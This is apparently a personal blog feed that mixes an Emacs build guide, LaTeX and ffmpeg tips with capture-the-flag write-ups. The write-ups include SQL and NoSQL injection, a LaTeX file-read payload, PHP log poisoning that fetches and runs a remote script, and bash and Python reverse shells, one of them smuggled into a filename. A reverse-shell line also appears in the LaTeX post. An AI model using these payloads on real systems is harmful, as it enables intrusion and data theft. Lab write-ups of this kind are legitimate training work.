item.title: How To Build Emacs
item.description:
This tutorial will demonstrate how to compile Emacs from source in order to enhance performance and achieve lightning-fast speeds. These instructions are applicable to all versions of Emacs.

What’s Enabled.

I personally have couple features i have enabled and disabled. Enabled features are.

  • Using MOLD Linker.
  • JIT (Just in Time) And AOT (Ahead Of Time) Compilation With All Cores.
  • GPM (Mouse Support)
  • Lucid (Graphical Toolkit Better than PGTK)
  • Xinput2
  • ALSA
  • Sitter (Tree Sitter)

Most of the disabled features i don’t need which include. My personal PKGBUILD is available Here that includes custom patches ( Mold With AOT ). AUR version will be available later after the release of this article.

The Build

Building Emacs slightly changes depending on which Linux distribution, you’re using. For my case I use Arch, so if you are using any Arch based this will work for you. Other distributions will also show how to do it.

Arch

Using my AUR package will automatically build it.

yay -S emacs29-lucid-native-comp-git

With my PKGBUILD install missing dependencies and install.

makepkg -si

Manually (Other Distros)

Clone Emacs29 (Or Your Version)

git clone -b emacs-29 git://git.sv.gnu.org/emacs.git
mkdir -p emacs-git/build && cd emacs-git/build

../configure --prefix=/usr --sysconfdir=/etc --libexecdir=/usr/lib --localstatedir=/var --mandir=/usr/share/man --with-gameuser=:games --with-modules --without-libotf --without-m17n-flt --without-gconf --with-native-compilation=yes --with-native-compilation=aot --with-x-toolkit=lucid --with-xft --with-xaw3d --without-cairo --with-sound=alsa --with-tree-sitter --without-compress-install --program-transform-name=s/\([ec]tags\)/\1.emacs/

Then running Mold (Make sure you have it installed)

mold -run make NATIVE_FULL_AOT=1 -j$(nproc)

Installing Emacs.

make install

Conclusion.

Although building Emacs from source can be time-consuming depending on the hardware, it can be a worthwhile endeavor to significantly improve its performance. Despite this, many people choose to forgo building from source due to the time investment, even though it would result in a much faster Emacs in the end.

item.title: HTB - Topology
item.description:
Topology is an easy box that starts off by finding a local file discloser vulnerability, In a LaTeX template, which allows us to get gain access by obtaining a password file with an encrypted password that’s reused by a user on the box. For ROOT there’s a setuid binary which we simply use to obtain root privileges.

Slim To None

User Enumeration

Open Ports

As usual with most boxes only 2 ports open.

  • 80 HTTP (Apache)
  • 22 SSH (OpenSSH)
#Nmap 7.93 scan initiated Fri Jun 16 21:37:29 2023 as: nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv 10.10.11.217
Nmap scan report for 10.10.11.217
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-06-16 21:37:30 UTC for 87s
Not shown: 38893 closed tcp ports (conn-refused), 26640 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+...[snip]...
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdH..[snip]..8R28Y4CDP7h0h9vnlLWo=
|   256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Initial Enum

Checking the http site, we just get a static site with a bunch users and an email and a list of projects. 

Lilian Klein (lklein@topology.htb)
Vajramani Daisley
Derek Abrahams

The interesting one is the LaTeX Equation Generator which is pointing to http://latex.topology.htb.

  • Vhost discovery.

    We also will look for any other subdomains that might be hidden. Like our other projects or something better. For that we’ll use Ffuf.

Interesting Discoveries

http://stats.topology.htb which is just a static webpage with jpg images. http://dev.topology.htb requires credentials in order to access it.

http://latex.topology.htb is an open directory listing which has couple files.

The interesting one is equation.php which allows us to run latex commands and it compiles it then convert it into a png.

Vulnerabilities And Exploitation

Before we get into the file discloser vulnerability, let’s take a step further explaining what LaTeX is. LaTeX is a typesetting system to create documents, meaning there’s not much we can do except for reading local TeX files. In LaTeX there’s quite few Engines like, LuaLaTex, pdflatex, XeTex, Tex, Latex, LaTeX2e.. there’s couple commands we can use to read a file.

\input{}
\include{}
\includeonly{}
\usepackage{}

However if we tried any of these commands, we’ll instead get an illegal command output, So we can verify there’s some sort of input validation checking, that will try to protect it.

Except in the directory listing we see couple TeX files presented, so there might be a package used that has the ability to read files. Check header.tex we can see the following packages used.

One that grabbed my attention was listings which a package support typeset source code, Mainly used for syntax highlighting, numbering and listings. If you used LaTeX before and listings package you might be familiar with \lsinputlisting which able to read a file.

\lsinputlisting[Language=Python]{myexample.py}
%% OR Without the setting options.
\lsinputlisting{myexample.py}

So let’s try it.

Hmm, it wasn’t able to successfully output an image. My first thoughts is that something is wrong with the back-end code that’s not handling LaTeX correctly like not escape backslash and its very common, when you create a preamble in elisp or in this case php So i’ve tried \\\lsinputlisting{/etc/passwd} and it still didn’t work. Then i remembered that from the web page this note.

LaTeX inline math mode syntax in the text field (only oneliners supported at the moment).

Of cource one-liners do use dollar signs that’s way it didn’t work correctly. In the backend its something like this.

$texfile=" \\document{article}
\\usepackage{listings}
\\usepacakge{amsmath}
\\usepackage{charter}
\\begin{document}
'$' . $textinput . '$'
\\end{document} "

in everything between $MATHHERE$ is considered a math equation. So let’s escape it.

\frac{1}{n^2}$\lstinputlisting{/etc/passwd}$\frac{1}{n*2}

and voila!

Obtaining Access.

I wasn’t able to read user’s ssh key, but since dev subdomain is auth protected. We can use our file discoloser vulnerability to obtain the password.

http://latex.topology.htb/equation.php?eqn=\frac{1}{n^2}$\lstinputlisting{/var/www/dev/.htpasswd}$\frac{1}{n*2}&submit=

Now Let’s convert our image to text.

And finally let’s crack it with hashcat.

Initial Access.

Using the cracked password we find, we’re able to ssh into the machine.

Privilege Escalation

Root is pretty straight forward, there’s a setuid binary (bash) we could use to gain root privileges and read the root flag.

item.title: LaTeX Tricks (Org-Mode LaTeX Included)
item.description:
A Bunch of LaTeX Tricks I’ve Gathered Over The Years, Also Include LaTeX Tricks Inside Of org-mode.

_

For a better understanding and examples, view this post in the PDF format.

LaTeX Only Tricks

LaTeX_Setup

Available Classes 

# #+LaTeX_CLASS: org-plain-latex
#+LaTeX_CLASS_OPTIONS: [letterpaper]
#+LaTeX_CLASS_OPTIONS: [11pt,twoside=false]

% book
# #+LaTeX_CLASS: book
# #+LaTeX_CLASS_OPTIONS: [letterpaper]

% Koma Article
# #+LaTeX_CLASS: koma-article
# #+LaTeX_CLASS_OPTIONS: [11pt,twoside=false,twocolumn]

% Koma book
# #+LaTeX_CLASS: koma-book
# #+LaTeX_CLASS_OPTIONS: [11pt,twoside=false,twocolumn]

% Memoir
# #+LaTeX_CLASS: memoir
# #+LaTeX_CLASS_OPTIONS: [11pt,oneside,onecolumn,openright,extrafontsizes]

Table Of Contents. 

\tableofcontents is how to include table of contents.
We can customize our table of contents before we include it using \usepackage{tocloft}.
Then customize each level from chapter, section, subsection, subsubsection.
\tocloftpagestyle{fancy}
\renewcommand{\cftsecafterpnum}{\vskip2pt}
\renewcommand{\cftsecfont}{\sffamily\bfseries\itshape}
...[snip]...

Or using the tcolorbox library to create a custom table of contents box.

\begin{tcolorbox}[breakable,enhanced jigsaw,title={Table Of Contents},fonttitle=\bfseries\Large,
  colback=yellow!10!white,colframe=red!50!black,before=\par\bigskip\noindent,
  interior style={fill overzoom image=goldshade.png,fill image opacity=0.25},
  colbacktitle=red!50!yellow!75!black,
  enlargepage flexible=\baselineskip,pad at break*=3mm,
  height fixed for=first and middle,
  watermark color=yellow!75!red!25!white,
  watermark text={\bfseries\large I'm batman},
  attach boxed title to top center={yshift=-0.25mm-\tcboxedtitleheight/2,yshifttext=2mm-\tcboxedtitleheight/2},
  boxed title style={enhanced,boxrule=0.5mm,
    frame code={ \path[tcb fill frame] ([xshift=-4mm]frame.west) -- (frame.north west)
      -- (frame.north east) -- ([xshift=4mm]frame.east)
      -- (frame.south east) -- (frame.south west) -- cycle; },
    interior code={ \path[tcb fill interior] ([xshift=-2mm]interior.west)
      -- (interior.north west) -- (interior.north east)
      -- ([xshift=2mm]interior.east) -- (interior.south east) -- (interior.south west)
      -- cycle;}  },
  drop fuzzy shadow]
  \makeatletter
  \@starttoc{toc} % Replace it with \@starttoc{lot} for tables and \@starttoc{lof} for figures.
  \makeatother
\end{tcolorbox}

Text Tricks

\textsf{text} \sffamily

\texttt{text} \ttfamily

\textsw{text} \swshape

\textrm{text} \rmfamily

\textmdtext} \mdfamily

\textbf{text} \bfseries

\textit{text} \itshape

\textsl{text} \slshape

\textsc{text} \scshape

\textscc{text} \sccshape

\textulc{text} \ulcshape

\textup{text} \upshape

More text tricks

paragraph formatting

Setting Paragraph Indentation 

\setlength{\parindent}{4mm} or using *em* or *pt*

Paragraph spacing 

\setlength{\parskip}{4mm} or using *em* or *pt*

Line spacing 

\renewcommand{\baselinestretch}{1.5}

This value is somewhat confusing, because:

value Line spacing
1.0 single spacing
1.3 1/2 spacing
1.6 double spacing

Line Break and Blank Spaces

Line Break

There are 3 ways to make a line break

\begin{lstlisting}
\\ Generates A Line Break
\hfill \break Another Way of Generating
\newline A Third Way
\end{lstlisting}

Page Breaks

To do a page break, there are two ways to do so.

\clearpage which puts on a new page
\newpage which does the same thing

Horizontal Blank Spaces

Horizontal spaces of arbitrary length may be inserted with.

\hspace{size_value} inserts a horizontal blank spaces
\hfill insert a blank space will stretch accordingly to fill the space available.
Something Similar to hfill
\hrulefill which insert blank spaces as horizontal ruler
\dotfill inserts blank spaces of dots
==> view the example below

Vertical Blank Spaces

Vertical blank spaces have the same syntax as horizontal ones.

\vspace{size_value} inserts a vertical spaces according to specified length.
\vfill insert a blank space that stretch accordingly to fill the vertical space available.
something Similar To Insert blank vertical space
\smallskip adds 3pt space plus or minus 1 (depends on document type,space available)
\medskip adds 6pt space plus or minus 2 (depends on document type,space available)
\bigskip adds 12pt space plus or minus 4 (depends on document type,space available)
==> view the example below

Additional Line Breaking 

\\* breaks the line at the point of the command and additionally prohibits a page break after the forced line break.
\break breaks the line without filling the current line. This will result in very bad formatting if you do not fill the line yourself.
\linebreak[number]
It breaks the line at the point of the command. The number provided as an argument represents the priority of the command in a range of 0 to 4. (0 means it will be easily ignored and 4 means do it anyway). When this line break option is used, LaTeX will try to produce the best line breaks possible.

Lengths and units

Units

List of available units in

Abbreviation Value
pt a point is approximately 1/72.27 inch, that means about 0.0138 inch or 0.3515 mm
mm a millimeter
cm a centimeter
in inch
ex roughly the height of an ‘x’ (lowercase) in the current font (it depends on the font used)
em roughly the width of an ‘M’ (uppercase) in the current font (it depends on the font used)
mu math unit equal to 1/18 em, where em is taken from the math symbols family
sp so-called “special points”, a low-level unit of measure where 65536sp=1pt

Lengths

Lengths are units of distance relative to some document elements. Lengths can be changed by the command:

\setlength{\lengthname}{value_in_specified_unit}

Below is a table with some of the most common lengths and their description.

Length Description
\verb!\baselineskip! Vertical distance between lines in a paragraph
\verb!\columnsep! Distance between columns
\verb!\columnwidth! The width of a column
\verb!\evensidemargin! Margin of even pages, commonly used in two-sided documents such as books
\verb!\linewidth! Width of the line in the current environment.
\verb!\oddsidemargin! Margin of odd pages, commonly used in two-sided documents such as books
\verb!\paperwidth! Width of the page
\verb!\paperheight! Height of the page
\verb!\parindent! Paragraph indentation
\verb!\parskip! Vertical space between paragraphs
\verb!\tabcolsep! Separation between columns in a table (tabular environment)
\verb!\textheight! Height of the text area in the page
\verb!\textwidth! Width of the text area in the page
\verb!\topmargin! Length of the top margin

Missing Emojis

In Case Of LuaTeX Code is already supplied in latex.setup

LaTeX Tricks In Org Mode

Unicode characters. 

{                                             }
<< => ==> <= <== >> $ %&()   ? ?? ffi !?  ?!  !!       ~ -> <-

Chat Block

Chat Box (Dialogue Type Like) Using snippet ("<ch") inside of org-mode. as we can use any TeX Syntax inside of chat block

#+begin_chat
\textcolor[HTML]{008b8b}{Jone} This is a nice chat\\
\textcolor[HTML]{b22222}{Maria} Yes Thank you
#+end_chat

\textcolor[HTML]{008b8b}{Jone} This is a nice chat
\textcolor[HTML]{b22222}{Maria} Yes Thank you

Ybox Block

Ybox is a colored box, that’s spits some text. Which can be initialized by using snippet ("<ybo"), settings to be used with this block. Can Be Set With LaTeX Attribute. :title, :ycolor, :ytfont

  • \tcblower To be used for doing the lowerpart.
#+ATTR_LATEX: :title Custom Text Box
#+begin_ybox
Lmfao This Text Box Sucks.
#+end_ybox

Lmfao This Text Box Sucks.

Shell Block

Shell Blocks or command shell boxes are to be used, to specify command shells in a box that’s used for demonstrating what i just described. (Snippet <cmd)

bash -c “bash -i >& /dev/tcp/192.168.1.110/9110 0>&1” what stty raw -echo && nc -lnvp 9110

We could also use a one liner (Snippet cmd$) (asterisk) for full command with to display like a directory or something.

Or Without (asterisk) To Display Whole Command.

Custom TcolorBox

Quotes And Example

More Code/Quotes blocks

Code Block 

#+begin_src <language> <options>
Refer to org-mode source blocks for a detailed manual.
#+end_src

Code Highlights in LaTeX is being done automatically using engraved backend Engrave-Faces

#include <stdio.h>

int main(argc a**) {
  printf("Hello World");
  return 0;
}

Example Block 

In This example will be going straight forward \Leftarrow

Quote Block

This is a insane quote

Let us change our traditional attitude to the construction of programs: Instead of imagining that our main task is to instruct a computer what to do, let us concentrate rather on explaining to human beings what we want a computer to do. — Donald Knuth

Double Sides Blocks

Parallel Items Similar To Minipage.

TODO KEYWORDs

TODO Keywords are highlighted automically when you export an org-mode file/buffer into LaTeX.

item.title: Ffmpeg Tricks
item.description:
Ffmpeg Tricks I’ve gathered over the years.

Table of Contents
  • Ffmpeg Tricks
    • Upscale Video
    • Reduce File Size
    • Mp4 To VP9 (Webm)
      • Constate Quality
      • Contrained Quality With Bitrate
      • Lossless Encoding
      • Speed And Quality
      • Personal Preference
    • Adding Audio To A Video
    • Cut/Split a video in N segments
    • Change Frame rate
      • Change fps while encoding
    • Add text watermark to video
    • Video Compression
    • Speed/Slow Down Video
    • Cut Video
    • 30 fps to 60fps

Ffmpeg Tricks

Upscale Video

Upscale Video To 4k

ffmpeg -i input.mp4 -vf scale=3840x2160:flags=lanczos output.mp4

Reduce File Size

Time in Seconds / File Size in GigaBits –> Used as bitrate

ffmpeg -i input.mp4 -b $(S/G) output.mp4

Mp4 To VP9 (Webm)

Constate Quality

H264 Quality Options from 0 to 64 (crf 28 best)

ffmpeg -i in.mp4 -c:v libvpx-vp9 -crf 28 -b:v 0 out.webm

Contrained Quality With Bitrate

A popular option from h264 encoding, a quality value is given between 0 and 63 with lower values meaning higher quality. It is recommended to use a value between 15 and 35. To use constant quality -b:v must be set and at zero: -b:v 0

ffmpeg -i in.mp4 -c:v libvpx-vp9 -crf 28 -b:v 1500k out.webm
  • With max and mix bitrate
ffmpeg -i in.mp4 -c:v libvpx-vp9 -minrate 400k -b:v 1500k -maxrate 2200k out.webm

Lossless Encoding 

ffmpeg -i in.mp4 -c:v libvpx-vp9 -lossless 1 out.webm

Speed And Quality

  • -deadline is the main option for VP9 encoding speed, as per media encoding lore the slower options do a more efficient encode.
  • good (default) is the recommended.
  • best has the finest compression (slow).
  • realtime live and fast encoding.
  • -cpu-used is how efficient the compression will be, when using a deadline of good or best the value that can be set must be between 0 and 5.

Default it is 0, 1 or 2 will increase speed but cost in quality and rate control. A value of 4 or 5 disables rate-distortion optimization thus having a greater impact on quality. To further utilize modern CPUs when encoding row-based multithreading can be turned on with -row-mt 1 this can help dramatically. More encoding speed can be achieved with specifying the CPU threads to use when encoding with -threads an example being: -threads 16.

ffmpeg -i in.mp4 -c:v libvpx-vp9 -row-mt 1 -threads 16 -cpu-used 2 -deadline good -crf 21 -b:v 0 out.webm

Personal Preference 

ffmpeg -i input.mp4 -c:v libvpx-vp9 -row-mt 1 -threads 48 -cpu-used 5 -deadline good -crf 28 -b:v 0 out.webm

Adding Audio To A Video 

ffmpeg -i video.mp4 -i audio.mp3 -c copy -map 0:v:0 -map 1:a:0 output.mp4

Cut/Split a video in N segments

Change N to the number of minutes / hours / seconds

ffmpeg -i videotocut.mp4 -c copy -map 0 -segment_time 00:0N:00 -f segment segment%03d.mp4

Change Frame rate

  • Change frame rate with ffmpeg with -filter:v fps=fps=25
# 60 Fps Video Make it to 30 fps video
ffmpeg -i inputvideo.mp4 -filter:v fps=fps=30 inputvideo_30fps.mp4

Change fps while encoding 

ffmpeg -i inputvideo.mp4 -filter:v fps=fps=30 -c:v libx264 -preset fast -crf 23 output.mp4

Add text watermark to video

adding a text watermark with drawtext from ffmpeg in bottom left

ffmpeg -i "input.mp4" -vf "drawtext=text='a watermark':x=10:y=H-th-10:fontfile=/pathto/font.ttf:fontsize=10:fontcolor=white:shadowcolor=black:shadowx=2:shadowy=2" "output.mp4"

Video Compression

Using ffmpeg --preset and -crf to determine best output size, preset is the encoding the compression rate, the slower the better therefor more quality in a smaller size. veryslow slower slow CRF means constant rate factor, essentially it is the bitrate amount without it being specific. Lower value = higher quality. 0 is lossless but a value of 17 or 18 is still visually lossless. 21 or 22 i find to be best but once you start going above 25 the quality drops away.

ffmpeg -i inputfilename.mp4 -c:v libx264 -preset veryslow -crf 21 outputfilename.mp4
  • Something little quicker
ffmpeg -i inputfilename.mp4 -c:v libx264 -preset slower -crf 22 outputfilename.mp4

Speed/Slow Down Video

To Speed Up .

ffmpeg -i input.mkv -filter:v "setpts=0.5*PTS" output.mkv

Using blending

ffmpeg -i typingspeed.mkv -vf "tblend=average,framestep=2,tblend=average,framestep=2,setpts=0.25*PTS" -r 60 output.mkv

Minterpolate Using ffmpeg ==> creates a 96 fps video

ffmpeg -i input -filter:v minterpolate -r 96 output

then speed it up

ffmpeg -i input -vf "tblend=average,framestep=2,tblend=average,framestep=2,tblend=average,framestep=2,tblend=average,framestep=2,setpts=0.25*PTS" -r 96 -b:v 30M -crf 10 -an output

move commands

fmpeg -i input.avi -filter:v "minterpolate='fps=120',setpts=4*PTS" output.avi
ffmpeg -i typingspeed.mkv -filter:v "minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'" output.mkv

Cut Video 

ffmpeg -i comeback-2022-02-24_17.38.33.mkv -ss 00:00:08 -to 00:03:47 -async 1 -c copy comeback.mp4
  • to cut microseconds add (dot.XXX) 00:00:08.100

30 fps to 60fps 

Four step search
ffmpeg -i input.mp4 -filter:v "minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=60:me=fss'" out.mp4

Diamond search
ffmpeg -i input.mp4 -filter:v  "minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=60:me=ds'" out.mp4

item.title: THM - CyberCrafted
item.description:
A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.

User Enumeration

Open Ports

  • 22 ssh (Ubuntu) , 80 Apache Httpd 2.4.49 , 25565 “Minecraft Server” ( Full Port Scan )

Initial Enum

  • 10.10.212.240 Redirect To #http://cybercrafted.thm/#
  • In Root Page We See a hint A Note to the developers: Just finished up adding other subdomains, now you can work on them!
    • Lets find those subdomains !

Found a bunch of subdomains using ffuf.

ffuf -w /opt/wordlists/raft-medium-words.txt:SUBS -H "Host: SUBS.cybercrafted.thm" -u http://10.10.212.240 -fs 0

Subs Found:
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 100ms]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 86ms]
  • Login Page at http://admin.cybercrafted.thm/login.php

ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://admin.cybercrafted.thm/FILE.php -mc 200,302

panel                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 90ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3023ms]
index                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 5030ms]
  • Found Search Engine At http://store.cybercrafted.thm/search.php
ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://store.cybercrafted.thm/FILE.php -mc 200,302

search                  [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 106ms]

Interesting Discoveries

  • Potential sql injection in http://store.cybercrafted.thm/search.php

Vulnerabilities And Exploitation

Time-Based Blind Sql Injection In http://store.cybercrafted.thm/search.php search=<Payload>&submit Using Sqlmap to automate exploitation of our sql injecetion .

  • Tables (Database: Webapp)

    sqlmap -u http://store.cybercrafted.thm/search.php --data "search=*&submit=" --tables

    | :— | | admin | | stock |

  • Columns (Table Admin)

    sqlmap -u http://store.cybercrafted.thm/search.php --data "search=*&submit=" --tamper=space2comment -D webapp -T admin --columns --threads=10
    Columns Type
    user varchar(32)
    hash varchar(64)
    id int(10) unsigned

  • Columns Dump

sqlmap -u http://store.cybercrafted.thm/search.php --data "search=*&submit=" --tamper=space2comment -D webapp -T admin --dump --threads=10 

| id | hash                                     | user                |
|:---|------------------------------------------|---------------------|
| 1  | 88b949dd5cdfbeAAAAAAAAbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe3159060AAAAAAAd9b195001f75008}    | web_flag            |
  • Web Flag

THM{bbe3159060AAAAAAAAd9b195001f75008}

Usernames And Passwords

  • Password Hash Cracked thanks to crackstation

    "xXUltimateCreeperXx": "diamondAAAAAAAA"

Command Execution

After grabbing credentials we can login to http://admin.cybercrafted.thm In http://admin.cybercrafted.thm/panel.php we can execute commands

We can then spawn a reverse shell and pwn the system.

/bin/bash -i >& /dev/tcp/10.8.134.23/9110 0>&1

Privilege Escalation

Interesting Discoveries

  • Found 2 Users (xxultimatecreeperxx, cybercrafted)
  • xxultimatecreeperxx Has encrypted ssh key in /home/xxultimatecreeperxx/.ssh

  • Attempting to crack with john will give us the following password.

  • Login in as xxultimatecreeperxx

  • Minecraft Server Flag

THM{ba93767ae3db9f5AAAAAAAA40a0c99e}

Possible Paths

  • Sketchy files at opt/minecraft

Vulnerabities Exploitation

  • Logging System Plugin Located in /opt/minecraft/cybercrafted/plugins/LoginSystem Which Contains Username/Password (hashed)

    cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb

    Yet Theres a log file which contains plain text password of both users

    [2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdiAAAAAAAAAA
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123

  • Ssh in as cybercrafted we can read the user flag and we can also see that we can execute screen as root.

  • We can Reattach to instance of cybercrafted then we can create a new window with C-a c And read the root flag.

item.title: HTB - Pikaboo
item.description:
A Hard Machine That Consist On Exploiting MisConfigurations

Slim To None

General Enumeration

Open Ports

21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)

Initial Enum

  • Web (80), Has AuthBasic (redirect to 401)

  • Confirmed Path Manipulation (Bypass 401) in /admin

    http://10.10.10.249/admin../server-status

Usernames And Passwords

  • No Credentials Found

Interesting Discoveries

  • admin page (http://10.10.10.249/admin) [Requires Credentials]
  • weird path /admin/adminstaging

Vulnerabilities And Exploitation

  • Possible Exploitation Path

log poisoning lead to RCE through LFI -> (Cache VSFTPD) -> RCE

  • Exploitation Of (Log Poisoning)
    1. We do have LFI adminstaging
    2. We Have A Valid Log file (/var/log/vsftpd.log)
    3. Payload
      1. USER Field
           <?php exec("curl http://10.10.14.210:8000/rev | bash")
      1. Inside Of rev
           #!/bin/bash
     /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.210/9110 0>&1'
      1. Curl The Path
           curl http://10.10.10.249/admin../admin_staging/index.php
     ?page=/var/log/vsftpd.log
  • Grab User.txt

User Enumeration

Interesting Discoveries

  • Cronjob (root) /usr/local/bin/csvupdatecron
  • /etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)

Passwords

  1. xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)
  2. Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]
  3. J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)

User

  • Grabing User Password Through Ldap

    ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb'

    • pwnmeow user

      # pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_'3m_4lL!_

Privilege Escalation

Vulnerabities Exploitation

From The Previous Cronjobs We found we noticed theres a script /usr/local/bin/csvupdatecron.

    #!/bin/bash
    
    for d in /srv/ftp/*
    do
      cd $d
      /usr/local/bin/csvupdate $(basename $d) *csv
      /usr/bin/rm -rf *
    done

Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files and directs them as argument to another script called csvupdate. Now as we read the perl script, we noticed it does use open() function to open files, However after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol | it will be interpreted as command thus being executed it. Now Our Root Path has become more clear to what we should do. I Found this stack overflow discussion which demonstrate , how we can achieve this. Unfortunately this was not that simple! Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow users ftp as we got his credentials previously. Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filenames as a path , which left us we fewer options. Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes. I Used the following oneliner reverse shell

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.210",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call("sh");'

After Editing it to escape double quotes and create an empty file

    touch "|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"10.10.14.210\"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("\"sh\"")';.csv"

Then we go back to ftp and upload it, ONE BIG FAT WARNING If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and youll get really frustrated on why not it didnt work like myself lol. Choose any folder , it doesnt matter which one and upload it to it . Notice in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds Youll receive a

item.title: THM - CMSpit
item.description:
CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.

CMS Enumeration

  • As always we start of with nmap to see what ports are open.

# Nmap 7.91 scan initiated Mon Aug  2 17:33:54 2021 as: nmap -sC -sV -oN initial.nmap 10.10.103.27
Nmap scan report for 10.10.103.27
Host is up (0.64s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  • there’s 2 ports open , first is ssh and the second one is http running apache in a ubuntu machine.
  • Going over to http://10.10.103.27 we can see it’s hosting Cockpit CMS.

  • Trying common default login credentials such as “admin:admin”,“admin:password” doesn’t work .

  • Next we enumerate further the CMS, checking first its login page source which reveals its version .

  • Heading over to google , it looks like Cockpit suffers from NoSql Injection and remote code execution which is a breaking deal, and even it has msf module written for it so u could just fire up msf and there u go straight to RCE (we will get to that later).

  • Also we see how we can enumeration users in two different ways .

User Enumeration

First Method /auth/forgotpassword Offers an easy way to enumerate users, however doing it manually is quite takes alot of effort and time .

  • Specifying a none existing user will result into the following

  • While Specifying a user that exists results into the following

You can script it to do the whole work for u.

Second Method Is by using /auth/requestreset and set the data to

{"user":{"$func":"var_dump"}}
  • this will dump all the users available on the cms

Second Method Which is the easiest way , is by using msf which is shown bellow .

CMS Exploitation.

Getting Reset Token

  • To obtain reset token we use the same payload we used to gather the 4 users , like below .

  • We can also use the payload to dump data about admin

Changing Admin Password

  • To change the admin password we simply send a request to /auth/resetpassword with the token we obtained and the new password we want to set .

Login To Admin Panel

  • After changing the admin password , we can simply login .

  • To grab the webflag we simply head over to /finder and we read webflag.php file

Foothold

  • There’s 2 ways two obtain RCE as i know .
  • To get RCE we simply create a new file and add malicious php code in it and execute it directly .

  • After we got code execution now we can procced to get a full reverse shell

  • And there we go we got a shell .

User Enumeration

  • There’s one user on the box Stux and we can access his home folder , listing hidden files we found few files that we can read .

